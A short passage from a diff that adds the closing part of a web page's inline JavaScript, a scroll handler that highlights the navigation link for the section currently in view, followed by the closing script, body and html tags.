+    var pos=window.scrollY+140,cur='';
+    secs.forEach(function(s){if(s.offsetTop<=pos)cur=s.id;});
+    links.forEach(function(a){a.classList.toggle('act',a.getAttribute('href')==='#'+cur);});
+  });
+});
+</script>
+</body>
+</html>
